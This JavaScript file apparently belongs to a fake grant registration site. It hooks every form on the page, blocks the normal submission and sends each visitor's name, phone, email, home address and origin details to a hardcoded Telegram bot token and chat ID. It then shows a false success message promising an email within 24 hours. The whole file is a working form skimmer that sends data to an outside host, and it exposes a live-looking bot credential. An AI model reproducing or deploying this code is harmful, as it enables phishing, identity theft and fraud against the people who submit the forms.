// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7703346296:AAHJF6wWgsbTFp4h6xoFf7kYstopxAUMcg8';
const TELEGRAM_CHAT_ID = '6381022912';

// Function to send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log('Message sent to Telegram successfully');
            return true;
        } else {
            console.error('Failed to send message to Telegram');
            return false;
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        return false;
    }
}

// Function to format form data for Telegram
function formatFormData(formData, formType) {
    let message = `<b>🆕 New ${formType} Registration</b>\n\n`;

    // Personal Information
    message += `<b>📋 Personal Information:</b>\n`;
    message += `👤 First Name: ${formData.first_name || 'N/A'}\n`;
    message += `👤 Middle Name: ${formData.middle_name || 'N/A'}\n`;
    message += `👤 Surname: ${formData.last_name || 'N/A'}\n`;
    message += `📱 Phone: ${formData.phone || 'N/A'}\n`;
    message += `📧 Email: ${formData.email || 'N/A'}\n\n`;

    // Location Information
    message += `<b>🌍 Location Information:</b>\n`;
    message += `🏛️ State of Origin: ${formData.state_origin || 'N/A'}\n`;
    message += `🏘️ LGA of Origin: ${formData.local_origin || 'N/A'}\n`;
    message += `🏠 State of Residence: ${formData.state_residence || 'N/A'}\n`;
    message += `🏙️ City/Town: ${formData.city_residence || 'N/A'}\n`;
    message += `🏡 Home Address: ${formData.home_address || 'N/A'}\n\n`;

    // Additional Information
    message += `<b>ℹ️ Additional Information:</b>\n`;
    // Handle the "hear about us" field which might be named differently
    const hearAbout = formData.hear_about || formData.how_hear || 'N/A';
    message += `📢 How they heard about us: ${hearAbout}\n`;
    message += `💰 Grant Amount Seeking: ${formData.grant_amount || 'N/A'}\n`;
    message += `🎯 Profile Type: ${formType}\n\n`;

    // Timestamp
    message += `⏰ Submitted: ${new Date().toLocaleString()}\n`;

    return message;
}

// Function to intercept form submissions
function interceptFormSubmissions() {
    // Get all forms on the page
    const forms = document.querySelectorAll('form');

    forms.forEach(form => {
        form.addEventListener('submit', async function(e) {
            e.preventDefault(); // Prevent default form submission

            try {
                // Get form data
                const formData = new FormData(form);
                const formObject = {};

                // Convert FormData to object
                for (let [key, value] of formData.entries()) {
                    formObject[key] = value;
                }

                console.log('Form data:', formObject); // Debug log

                // Determine form type from hidden input or page URL
                let formType = 'Unknown';

                // First try to get from hidden form_type input
                const hiddenFormType = form.querySelector('input[name="form_type"][type="hidden"]');
                if (hiddenFormType && hiddenFormType.value) {
                    formType = hiddenFormType.value;
                } else {
                    // Fallback to determining from page URL
                    const currentPage = window.location.pathname;
                    if (currentPage.includes('aspiring-business-owner')) {
                        formType = 'Aspiring Business Owner';
                    } else if (currentPage.includes('business-owner')) {
                        formType = 'Business Owner';
                    } else if (currentPage.includes('jobseeker')) {
                        formType = 'Job Seeker';
                    } else if (currentPage.includes('working-class')) {
                        formType = 'Working Class Professional';
                    }
                }

                console.log('Form type determined:', formType); // Debug log

                // Format and send data to Telegram
                const message = formatFormData(formObject, formType);
                const success = await sendToTelegram(message);

                if (success) {
                    // Show success message
                    if (typeof Swal !== 'undefined') {
                        Swal.fire({
                            icon: 'success',
                            title: 'Success!',
                            text: 'Your information has been submitted successfully. You will receive an email within 24 hours.',
                            confirmButtonText: 'OK'
                        });
                    } else {
                        alert('Your information has been submitted successfully! You will receive an email within 24 hours.');
                    }
                } else {
                    throw new Error('Failed to send to Telegram');
                }
            } catch (error) {
                console.error('Form submission error:', error);
                // Show error message
                if (typeof Swal !== 'undefined') {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error!',
                        text: 'There was an error submitting your information. Please try again.',
                        confirmButtonText: 'OK'
                    });
                } else {
                    alert('There was an error submitting your information. Please try again.');
                }
            }
        });
    });
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing form interceptors');
    interceptFormSubmissions();
});

// Also initialize if the script is loaded after DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', interceptFormSubmissions);
} else {
    console.log('DOM already ready, initializing form interceptors');
    interceptFormSubmissions();
}